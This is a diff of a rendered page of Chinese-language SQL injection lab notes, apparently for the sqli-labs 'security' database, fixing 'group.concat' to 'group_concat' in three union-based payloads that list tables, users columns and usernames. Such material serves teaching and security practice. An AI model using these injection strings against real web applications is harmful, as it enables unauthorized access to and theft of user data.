@@ -270,13 +270,13 @@ id<span class="pl-k">=</span><span class="pl-k">-</span><span class="pl-c1">1</s
 <span class="pl-c"><span class="pl-c">#</span>由于网站限制，只能显示一行，但是返回结果是多行，所以报错。</span>
 其中information_schema 是MySQL数据库中一个特殊的数据库，它包含了数据库服务器的元数据信息，比如数据库名、表名、列名、权限等等
 
-id<span class="pl-k">=</span><span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-s"><span class="pl-pds">'</span> union select 1,(select group.concat(table_name) from information_schema.tables where table_schema=<span class="pl-pds">'</span></span>security<span class="pl-s"><span class="pl-pds">'</span>),3--+  </span>
+id<span class="pl-k">=</span><span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-s"><span class="pl-pds">'</span> union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=<span class="pl-pds">'</span></span>security<span class="pl-s"><span class="pl-pds">'</span>),3--+  </span>
 <span class="pl-s">#正确显示出所有表名</span>
 <span class="pl-s"></span>
-<span class="pl-s">id=-1<span class="pl-pds">'</span></span> <span class="pl-k">union</span> <span class="pl-k">select</span> <span class="pl-c1">1</span>,(<span class="pl-k">select</span> <span class="pl-c1">group</span>.<span class="pl-c1">concat</span>(column_name) <span class="pl-k">from</span> <span class="pl-c1">information_schema</span>.<span class="pl-c1">columns</span> <span class="pl-k">where</span> table_schema<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>security<span class="pl-pds">'</span></span> <span class="pl-k">and</span> table_name<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>users<span class="pl-pds">'</span></span>),<span class="pl-c1">3</span><span class="pl-c"><span class="pl-c">--</span>+   </span>
+<span class="pl-s">id=-1<span class="pl-pds">'</span></span> <span class="pl-k">union</span> <span class="pl-k">select</span> <span class="pl-c1">1</span>,(<span class="pl-k">select</span> group_concat(column_name) <span class="pl-k">from</span> <span class="pl-c1">information_schema</span>.<span class="pl-c1">columns</span> <span class="pl-k">where</span> table_schema<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>security<span class="pl-pds">'</span></span> <span class="pl-k">and</span> table_name<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>users<span class="pl-pds">'</span></span>),<span class="pl-c1">3</span><span class="pl-c"><span class="pl-c">--</span>+   </span>
 <span class="pl-c"><span class="pl-c">#</span>查找users表中各列（字段）的名称</span>
 
-id<span class="pl-k">=</span><span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-s"><span class="pl-pds">'</span> union select 1,(select group.concat(username) from users),3--+  </span>
+id<span class="pl-k">=</span><span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-s"><span class="pl-pds">'</span> union select 1,(select group_concat(username) from users),3--+  </span>
 <span class="pl-s">#查询users表中username这一列的所有值</span></pre></div></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
